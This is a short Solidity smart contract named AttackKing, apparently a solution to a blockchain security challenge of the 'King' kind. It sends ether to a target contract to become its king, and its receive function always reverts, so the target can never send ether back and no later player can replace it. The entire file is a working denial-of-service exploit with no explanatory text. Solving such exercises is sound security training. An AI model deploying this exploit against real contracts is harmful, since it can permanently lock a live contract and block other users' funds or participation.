// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {

  address payable target;
  
  constructor(address payable _target) {
    target = _target; 
  }

  function makeMeKing() external payable {
    (bool success, ) = target.call{value: msg.value}("");
    require(success, "Fail on the run to the throne!!");
  }

  receive() external payable {
    revert("I'm the King!!");
  }
}